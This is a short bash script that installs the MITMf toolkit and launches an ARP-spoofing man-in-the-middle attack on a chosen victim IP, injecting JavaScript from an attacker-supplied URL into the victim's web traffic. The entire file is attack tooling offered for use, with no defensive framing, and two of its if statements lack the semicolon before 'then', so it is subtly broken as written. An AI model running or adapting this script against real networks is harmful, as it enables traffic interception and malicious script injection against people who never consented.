#!/bin/bash
if [[ $EUID -ne 0 ]]; then
   echo "Error: You must be running this as root!"
   exit 1
fi
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ] || [ -z "$4" ] || [ -z "$5" ] then
	echo "IT IS HIGHLY RECOMMENDED TO RUN THIS SCRIPT ON KALI LINUX OR A DIST SIMILAR TO KALI WITH SIMILAR BUILT IN TOOLS!"
    echo 'USAGE: ./silly.sh [gateway_ip(ex: 192.168.1.1)] [victim_ip(ex: 192.168.1.120)] [javascript_inject_url(ex: http://example.com/something.js)] [interface(ex: eth0, wlan0, etc)] [download_mitmf(true/false)]'
    exit 0
fi
THEGATEWAY=$1
THEVICTIM=$2
INJECTURL=$3
INTERFACE=$4
if [ "$5" = "true" ]  then
	apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file
	sleep 1
	apt-get install whiptail
	sleep 1
	pip install virtualenvwrapper
	sleep 1
	source $(which virtualenvwrapper.sh)
	sleep 1
	mkvirtualenv MITMf -p /usr/bin/python2.7
	sleep 1
	git clone https://github.com/byt3bl33d3r/MITMf
	sleep 1
	cd MITMf && git submodule init && git submodule update --recursive
	sleep 1
	pip install -r requirements.txt
	sleep 1
	#read -p "Press ENTER to begin!"
	whiptail --msgbox "Press ENTER to start!" 10 40
	python mitmf.py --arp --spoof -i $INTERFACE --gateway $THEGATEWAY --targets $THEVICTIM --inject --js-url $INJECTURL
	exit 0  
else
	cd /home/MITMf
	source $(which virtualenvwrapper.sh)
	sleep 1
	mkvirtualenv MITMf -p /usr/bin/python2.7
	sleep 1
	#read -p "Press ENTER to begin!"
	whiptail --msgbox "Press ENTER to start!" 10 40
	python mitmf.py --arp --spoof -i $INTERFACE --gateway $THEGATEWAY --targets $THEVICTIM --inject --js-url $INJECTURL
	exit 0
fi
